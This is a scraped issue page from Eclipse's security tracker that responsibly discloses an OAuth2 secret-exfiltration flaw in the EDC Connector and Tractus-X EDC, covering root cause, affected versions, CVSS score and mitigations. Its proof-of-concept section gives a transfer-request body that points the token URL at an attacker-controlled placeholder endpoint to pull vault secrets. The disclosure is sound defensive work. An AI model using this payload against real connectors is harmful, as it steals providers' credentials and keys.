href=\&quot;https://github.com/eclipse-tractusx/managed-simple-data-exchanger-backend/blob/v2.3.6/modules/sde-external-services/edc/src/main/java/org/eclipse/tractusx/sde/edc/entities/request/asset/AssetEntryRequestFactory.java#L109\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eSimple Data Exchanger\u003c/a\u003e, a Catena-X component, also under stewardship of the Eclipse Tractus-X project, that integrates with the EDC, may require certain secrets to be created with fixed names. Therefore, if an attacker knows such applications are in use, they know the corresponding secret is likely to exist, making it a prime target for exfiltration. Alternatively, dictionary attacks and brute force may be viable approaches to extract other secrets that may or may not exist.\u0026#x000A;Technical Description\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;39:1-39:2275\&quot; dir=\&quot;auto\&quot;\u003eThis issue has been reproduced in core-EDC version 0.2.1. It arises if the data-plane-http-oauth2 extension is used with the \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/control-plane/transfer/transfer-data-plane/src/main/java/org/eclipse/edc/connector/transfer/dataplane/flow/ProviderPushTransferDataFlowController.java\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eProviderPushTransferDataFlowController\u003c/a\u003e of the transfer-data-plane Extension. The \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2HttpRequestParamsDecorator.java\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eOauth2HttpRequestParamsDecorator\u003c/a\u003e will be invoked for both \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L58\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eSourceDataAddress\u003c/a\u003e as well as \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L66\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eDestinationDataAddress\u003c/a\u003e in the \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eHttpRequestParamsProviderImpl\u003c/a\u003e, executed by the provider data-plane. When \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L68\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ebuilding the Oauth2CredentialsRequest in the Oauth2CredentialsRequestFactory\u003c/a\u003e the \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L90\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003evault is invoked\u003c/a\u003e to resolve the secret from the passed DataAddress. It is also invoked for the DestinationDataAddress, which is passed by the consumer and can be manipulated by an attacker. An attacker can freely choose the alias to be resolved in the \&quot;oauth2:clientSecretKey\&quot; property. The resolved secret is then sent to the URL specified in the \&quot;oauth2:tokenUrl\&quot; property.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;41:1-42:6\&quot; dir=\&quot;auto\&quot;\u003eThe issue can be resolved by removing the Oauth2HttpRequestParamsDecorator for Sinks in the \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eDataPlaneHttpOauth2Extension\u003c/a\u003e. However, this would lead to removing the OAuth2 feature for sinks using push transfers.\u0026#x000A;Impact\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;44:1-44:304\&quot; dir=\&quot;auto\&quot;\u003eGiven an EDC instance with a single publicly available contract definition, the described attack allows any attacker in the same data space as the target to exfiltrate arbitrary secrets from the target&#39;s secrets vault, including internal credentials, such as those for authentication via SSI/MIW or DAPS.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;46:1-47:10\&quot; dir=\&quot;auto\&quot;\u003eWe have assessed this vulnerability at a 9.3/10 CRITICAL CVSS v4.0 score. CVSS vector: \u003ca href=\&quot;https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red\u003c/a\u003e\u0026#x000A;Weaknesses\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;49:5-51:0\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e[CWE-201](https://cwe.mitre.org/data/definitions/201.html): Insertion of Sensitive Information Into Sent Data\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e[CWE-522](https://cwe.mitre.org/data/definitions/522.html): Insufficiently Protected Credentials\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;52:1-52:40\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-affected-versions-and-configurations\&quot; class=\&quot;anchor\&quot; href=\&quot;#affected-versions-and-configurations\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eAffected versions and configurations\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;54:1-54:746\&quot; dir=\&quot;auto\&quot;\u003eWe have tested against version 0.5.4 of the \u003ca href=\&quot;https://github.com/eclipse-tractusx/tractusx-edc/tree/0.5.4\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eTractus-X EDC distribution\u003c/a\u003e, based on version 0.2.1 of the \u003ca href=\&quot;https://github.com/eclipse-edc/Connector\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ecore EDC\u003c/a\u003e. To deploy the Tractus-X EDC, we used the Helm chart contained in the repository itself. To reproduce the issue, we had to enable HttpData in the destination types by adding it to the environment variable EDC_DATAPLANE_SELECTOR_DEFAULTPLANE_DESTINATIONTYPES in the control plane. Its final value was HttpProxy,AmazonS3,HttpData, with the first two being the default value set by the chart itself. Notably, this change was recently made default in pull request \u003ca href=\&quot;https://github.com/eclipse-tractusx/tractusx-edc/pull/1244\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e#1244\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;56:1-57:10\&quot; dir=\&quot;auto\&quot;\u003eWe were unfortunately unable to test against latest core EDC versions. However, we have inspected the code and relevant portions have not been modified since, so we believe the issue may still be present in current versions.\u0026#x000A;Mitigation\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;59:1-59:74\&quot; dir=\&quot;auto\&quot;\u003eUntil fixes are made available, the following mitigation approaches exist:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;61:5-66:0\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDisable support for OAuth2-protected data sinks entirely\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eEmploy WAF solutions to reject requests containing clientSecretKeys\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eInclude a cryptographically secure random component in each secret name in the secrets vaults\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eEnsure all available contract definitions can only be consumed by trusted consumers\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDisable data plane secrets vault access entirely (may break other functionality)\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;67:1-67:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-disabling-of-oauth2-protected-data-sinks\&quot; class=\&quot;anchor\&quot; href=\&quot;#disabling-of-oauth2-protected-data-sinks\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eDisabling of OAuth2-protected data sinks\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;69:1-70:16\&quot; dir=\&quot;auto\&quot;\u003eIf recompiling the EDC from source is an option, then removing this line of code will alleviate the vulnerability: \u003ca href=\&quot;https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61\u003c/a\u003e\u0026#x000A;Proof of Concept\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;72:5-76:0\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eProvider (attack target): create publicly available contract definition\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eConsumer (attacker)\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e    Negotiate contract for previously created contract definition\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e    Initiate transfer to OAuth2-protected data sink For that, send a POST request to /v2/transferprocesses of the consuming connector&#39;s management API with the following body. json { \&quot;@type\&quot;: https://w3id.org/edc/v0.0.1/ns/TransferRequest, https://w3id.org/edc/v0.0.1/ns/assetId: \&quot;{{ASSET_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/contractId: \&quot;{{CONTRACT_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/connectorAddress: \&quot;{{PROVIDER_EDC_DSP_ENDPOINT}}\&quot;, https://w3id.org/edc/v0.0.1/ns/connectorId: \&quot;{{PROVIDER_EDC_PARTICIPANT_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/dataDestination: { https://w3id.org/edc/v0.0.1/ns/type: \&quot;HttpData\&quot;, https://w3id.org/edc/v0.0.1/ns/baseUrl: \&quot;{{attacker_controlled_endpoint}}\&quot;, \&quot;oauth2:tokenUrl\&quot;: \&quot;{{attacker_controlled_endpoint}}\&quot;, \&quot;oauth2:clientId\&quot;: \&quot;example\&quot;, \&quot;oauth2:clientSecretKey\&quot;: \&quot;{{target_vault_secret_key}}\&quot; }, https://w3id.org/edc/v0.0.1/ns/properties: {}, https://w3id.org/edc/v0.0.1/ns/privateProperties: {}, https://w3id.org/edc/v0.0.1/ns/protocol: \&quot;dataspace-protocol-http\&quot;, https://w3id.org/edc/v0.0.1/ns/managedResources: false }\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;77:1-77:188\&quot; dir=\&quot;auto\&quot;\u003eAfter initiating the transfer, the selected secret will be sent to the {{attacker_controlled_endpoint}} as the client_secret paramater of an application/x-www-form-urlencoded POST request.\u003c/p\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;\u003c!--\nNote that this issue is configured (see the quick actions at the bottom) to be created as confidential.\n\nNote that a vulnerability does not need to actually be resolved before it is reported and that these reports can be revised as needed (reopen the issue to request changes).\n\nIf you do not know how to fill certain fields, mark that in the comment and we will help you.\n\nYou can delete the comments (or not).\n--\u003e\n\n\u003c!--\nRequired. Specify the project&#39;s name (e.g., \&quot;Eclipse Dash\&quot;) and Eclipse Foundation ID, e.g., \&quot;technology.dash\&quot;.\n--\u003e\n\n## Basic information\n\n**Project name:** Eclipse EDC\n\n**Project id:** technology.edc\n\n## Details of the issue\n\nReported on the security ML:\n\nWe have identified a security vulnerability in the EDC project (https://github.com/eclipse-edc/Connector) version 0.2.1 (at least down to version MS8) regarding the OAuth2-protected data sink feature which we rate with at a 9.3/10 CRITICAL CVSS v4.0 score. This project is also used in the Eclipse project (https://github.com/eclipse-tractusx/tractusx-edc) where we can verify the vulnerability at least for release 0.5.4. As we have identified a [recent code change](https://github.com/eclipse-tractusx/tractusx-edc/pull/1244) in Tractus-X EDC that now allows to exploit the vulnerability by default, we prioritized disclosure over further deeper analysis and reproducibility of latest released versions, since we want to avoid any negative impact including reputation on the young projects and data space initiatives like Catena-X. To our opinion (concluded by a first review of the current code) the vulnerability most probably persists for Connector version 0.6.2 and Tractus-X EDC version 0.7.0\n\nWhen using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider&#39;s vault, not the consumer. This secret&#39;s value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.\n\n \n### Details\n\nThe vulnerability is twofold, but the core issue is that the provider data plane resolves clientSecretKeys specified in data sink data addresses provided by consumers. This means that a malicious consumer can induce the provider to load any known secret from the provider&#39;s vault and use it as an OAuth2 client secret, with the resulting token being sent to the consumer-controlled data sink. This alone already allows significant credential exfiltration: If a malicious consumer knows that the client secret for a known client ID is stored at a known vault key, e.g., because the provider themself has an OAuth2-protected data source, the consumer can harvest the resulting access token from their data sink and use it to authorize against such protected resource that should only be accessible by the provider.\n\nThe second part is that the tokenUrl, to which the provider submits the resolved credentials to retrieve an access token, is also controlled by the consumer. With the previously described attack, it was only possible to exfiltrate OAuth2 access tokens, which are usually short-lived and require the attacker to know the corresponding client ID and token URL. However, by providing an attacker-controlled endpoint as the tokenUrl, the attacker can exfiltrate arbitrary secrets from the provider&#39;s vault, as the provider data plane will send the resolved secret to that endpoint as part of an OAuth2 client credentials grant. This allows exfiltration of longer-lived secrets like OAuth2 client secret, cryptographic keys, etc. Notably, compared to the first attack, an attacker needs significantly less information to conduct this attack; they only need to know the desired secret&#39;s name (\&quot;key\&quot;) in the secrets vault.\n\nThe latter problem is exacerbated by the fact that third-party integrations, like the [Simple Data Exchanger](https://github.com/eclipse-tractusx/managed-simple-data-exchanger-backend/blob/v2.3.6/modules/sde-external-services/edc/src/main/java/org/eclipse/tractusx/sde/edc/entities/request/asset/AssetEntryRequestFactory.java#L109), a Catena-X component, also under stewardship of the Eclipse Tractus-X project, that integrates with the EDC, may require certain secrets to be created with fixed names. Therefore, if an attacker knows such applications are in use, they know the corresponding secret is likely to exist, making it a prime target for exfiltration. Alternatively, dictionary attacks and brute force may be viable approaches to extract other secrets that may or may not exist.\nTechnical Description\n\nThis issue has been reproduced in core-EDC version 0.2.1. It arises if the data-plane-http-oauth2 extension is used with the [ProviderPushTransferDataFlowController](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/control-plane/transfer/transfer-data-plane/src/main/java/org/eclipse/edc/connector/transfer/dataplane/flow/ProviderPushTransferDataFlowController.java) of the transfer-data-plane Extension. The [Oauth2HttpRequestParamsDecorator](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2HttpRequestParamsDecorator.java) will be invoked for both [SourceDataAddress](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L58) as well as [DestinationDataAddress](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L66) in the [HttpRequestParamsProviderImpl](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java), executed by the provider data-plane. When [building the Oauth2CredentialsRequest in the Oauth2CredentialsRequestFactory](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L68) the [vault is invoked](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L90) to resolve the secret from the passed DataAddress. It is also invoked for the DestinationDataAddress, which is passed by the consumer and can be manipulated by an attacker. An attacker can freely choose the alias to be resolved in the \&quot;oauth2:clientSecretKey\&quot; property. The resolved secret is then sent to the URL specified in the \&quot;oauth2:tokenUrl\&quot; property.\n\nThe issue can be resolved by removing the Oauth2HttpRequestParamsDecorator for Sinks in the [DataPlaneHttpOauth2Extension](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61). However, this would lead to removing the OAuth2 feature for sinks using push transfers.\nImpact\n\nGiven an EDC instance with a single publicly available contract definition, the described attack allows any attacker in the same data space as the target to exfiltrate arbitrary secrets from the target&#39;s secrets vault, including internal credentials, such as those for authentication via SSI/MIW or DAPS.\n\nWe have assessed this vulnerability at a 9.3/10 CRITICAL CVSS v4.0 score. CVSS vector: [CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red)\nWeaknesses\n\n    [CWE-201](https://cwe.mitre.org/data/definitions/201.html): Insertion of Sensitive Information Into Sent Data\n    [CWE-522](https://cwe.mitre.org/data/definitions/522.html): Insufficiently Protected Credentials\n\n### Affected versions and configurations\n\nWe have tested against version 0.5.4 of the [Tractus-X EDC distribution](https://github.com/eclipse-tractusx/tractusx-edc/tree/0.5.4), based on version 0.2.1 of the [core EDC](https://github.com/eclipse-edc/Connector). To deploy the Tractus-X EDC, we used the Helm chart contained in the repository itself. To reproduce the issue, we had to enable HttpData in the destination types by adding it to the environment variable EDC_DATAPLANE_SELECTOR_DEFAULTPLANE_DESTINATIONTYPES in the control plane. Its final value was HttpProxy,AmazonS3,HttpData, with the first two being the default value set by the chart itself. Notably, this change was recently made default in pull request [#1244](https://github.com/eclipse-tractusx/tractusx-edc/pull/1244).\n\nWe were unfortunately unable to test against latest core EDC versions. However, we have inspected the code and relevant portions have not been modified since, so we believe the issue may still be present in current versions.\nMitigation\n\nUntil fixes are made available, the following mitigation approaches exist:\n\n    Disable support for OAuth2-protected data sinks entirely\n    Employ WAF solutions to reject requests containing clientSecretKeys\n    Include a cryptographically secure random component in each secret name in the secrets vaults\n    Ensure all available contract definitions can only be consumed by trusted consumers\n    Disable data plane secrets vault access entirely (may break other functionality)\n\n### Disabling of OAuth2-protected data sinks\n\nIf recompiling the EDC from source is an option, then removing this line of code will alleviate the vulnerability: https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61\nProof of Concept\n\n    Provider (attack target): create publicly available contract definition\n    Consumer (attacker)\n        Negotiate contract for previously created contract definition\n        Initiate transfer to OAuth2-protected data sink For that, send a POST request to /v2/transferprocesses of the consuming connector&#39;s management API with the following body. json { \&quot;@type\&quot;: https://w3id.org/edc/v0.0.1/ns/TransferRequest, https://w3id.org/edc/v0.0.1/ns/assetId: \&quot;{{ASSET_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/contractId: \&quot;{{CONTRACT_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/connectorAddress: \&quot;{{PROVIDER_EDC_DSP_ENDPOINT}}\&quot;, https://w3id.org/edc/v0.0.1/ns/connectorId: \&quot;{{PROVIDER_EDC_PARTICIPANT_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/dataDestination: { https://w3id.org/edc/v0.0.1/ns/type: \&quot;HttpData\&quot;, https://w3id.org/edc/v0.0.1/ns/baseUrl: \&quot;{{attacker_controlled_endpoint}}\&quot;, \&quot;oauth2:tokenUrl\&quot;: \&quot;{{attacker_controlled_endpoint}}\&quot;, \&quot;oauth2:clientId\&quot;: \&quot;example\&quot;, \&quot;oauth2:clientSecretKey\&quot;: \&quot;{{target_vault_secret_key}}\&quot; }, https://w3id.org/edc/v0.0.1/ns/properties: {}, https://w3id.org/edc/v0.0.1/ns/privateProperties: {}, https://w3id.org/edc/v0.0.1/ns/protocol: \&quot;dataspace-protocol-http\&quot;, https://w3id.org/edc/v0.0.1/ns/managedResources: false }\n\nAfter initiating the transfer, the selected secret will be sent to the {{attacker_controlled_endpoint}} as the client_secret paramater of an application/x-www-form-urlencoded POST request.\n\n\u003c!--\n  Please, do not remove the line below. It will create a confidential issue that will be visible\n  only to you and the members of this project. Confidential issues are used to keep security\n  vulnerabilities private until they are sorted out.\n  Eclipse Projects follow Responsible Disclosure best practices: the initial report is made privately,\n  but with the full details being published once a patch has been made available (sometimes with\n  a delay to allow more time for the patches to be installed).\n--\u003e&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;security/vulnerability-reports&quot;,&quot;iid&quot;:198,&quot;issuableId&quot;:636913,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:2023,&quot;authorName&quot;:&quot;Tiago Lucas&quot;,&quot;authorUsername&quot;:&quot;tiagolucas&quot;,&quot;authorWebUrl&quot;:&quot;/tiagolucas&quot;,&quot;createdAt&quot;:&quot;2024-04-24T13:16:24+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;publishedIncidentUrl&quot;:null,&quot;slaFeatureAvailable&quot;:&quot;false&quot;,&quot;uploadMetricsFeatureAvailable&quot;:&quot;false&quot;,&quot;projectId&quot;:3804,&quot;projectPath&quot;:&quot;vulnerability-reports&quot;,&quot;projectNamespace&quot;:&quot;security&quot;,&quot;canAdmin&quot;:false,&quot;hasIssueWeightsFeature&quot;:true,&quot;hasIterationsFeature&quot;:true,&quot;canAdminRelation&quot;:false}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability</h1>
</div>
<div class="description">
<div class="md">&#x000A;&#x000A;<h2 data-sourcepos="15:1-15:20" dir="auto">&#x000A;<a id="user-content-basic-information" class="anchor" href="#basic-information" aria-hidden="true"></a>Basic information</h2>&#x000A;<p data-sourcepos="17:1-17:29" dir="auto"><strong>Project name:</strong> Eclipse EDC</p>&#x000A;<p data-sourcepos="19:1-19:30" dir="auto"><strong>Project id:</strong> technology.edc</p>&#x000A;<h2 data-sourcepos="21:1-21:23" dir="auto">&#x000A;<a id="user-content-details-of-the-issue" class="anchor" href="#details-of-the-issue" aria-hidden="true"></a>Details of the issue</h2>&#x000A;<p data-sourcepos="23:1-23:28" dir="auto">Reported on the security ML:</p>&#x000A;<p data-sourcepos="25:1-25:999" dir="auto">We have identified a security vulnerability in the EDC project (<a href="https://github.com/eclipse-edc/Connector" rel="nofollow noreferrer noopener" target="_blank">https://github.com/eclipse-edc/Connector</a>) version 0.2.1 (at least down to version MS8) regarding the OAuth2-protected data sink feature which we rate with at a 9.3/10 CRITICAL CVSS v4.0 score. This project is also used in the Eclipse project (<a href="https://github.com/eclipse-tractusx/tractusx-edc" rel="nofollow noreferrer noopener" target="_blank">https://github.com/eclipse-tractusx/tractusx-edc</a>) where we can verify the vulnerability at least for release 0.5.4. As we have identified a <a href="https://github.com/eclipse-tractusx/tractusx-edc/pull/1244" rel="nofollow noreferrer noopener" target="_blank">recent code change</a> in Tractus-X EDC that now allows to exploit the vulnerability by default, we prioritized disclosure over further deeper analysis and reproducibility of latest released versions, since we want to avoid any negative impact including reputation on the young projects and data space initiatives like Catena-X. To our opinion (concluded by a first review of the current code) the vulnerability most probably persists for Connector version 0.6.2 and Tractus-X EDC version 0.7.0</p>&#x000A;<p data-sourcepos="27:1-27:536" dir="auto">When using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider's vault, not the consumer. This secret's value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.</p>&#x000A;<h3 data-sourcepos="30:1-30:11" dir="auto">&#x000A;<a id="user-content-details" class="anchor" href="#details" aria-hidden="true"></a>Details</h3>&#x000A;<p data-sourcepos="32:1-32:812" dir="auto">The vulnerability is twofold, but the core issue is that the provider data plane resolves clientSecretKeys specified in data sink data addresses provided by consumers. This means that a malicious consumer can induce the provider to load any known secret from the provider's vault and use it as an OAuth2 client secret, with the resulting token being sent to the consumer-controlled data sink. This alone already allows significant credential exfiltration: If a malicious consumer knows that the client secret for a known client ID is stored at a known vault key, e.g., because the provider themself has an OAuth2-protected data source, the consumer can harvest the resulting access token from their data sink and use it to authorize against such protected resource that should only be accessible by the provider.</p>&#x000A;<p data-sourcepos="34:1-34:915" dir="auto">The second part is that the tokenUrl, to which the provider submits the resolved credentials to retrieve an access token, is also controlled by the consumer. With the previously described attack, it was only possible to exfiltrate OAuth2 access tokens, which are usually short-lived and require the attacker to know the corresponding client ID and token URL. However, by providing an attacker-controlled endpoint as the tokenUrl, the attacker can exfiltrate arbitrary secrets from the provider's vault, as the provider data plane will send the resolved secret to that endpoint as part of an OAuth2 client credentials grant. This allows exfiltration of longer-lived secrets like OAuth2 client secret, cryptographic keys, etc. Notably, compared to the first attack, an attacker needs significantly less information to conduct this attack; they only need to know the desired secret's name ("key") in the secrets vault.</p>&#x000A;<p data-sourcepos="36:1-37:21" dir="auto">The latter problem is exacerbated by the fact that third-party integrations, like the <a href="https://github.com/eclipse-tractusx/managed-simple-data-exchanger-backend/blob/v2.3.6/modules/sde-external-services/edc/src/main/java/org/eclipse/tractusx/sde/edc/entities/request/asset/AssetEntryRequestFactory.java#L109" rel="nofollow noreferrer noopener" target="_blank">Simple Data Exchanger</a>, a Catena-X component, also under stewardship of the Eclipse Tractus-X project, that integrates with the EDC, may require certain secrets to be created with fixed names. Therefore, if an attacker knows such applications are in use, they know the corresponding secret is likely to exist, making it a prime target for exfiltration. Alternatively, dictionary 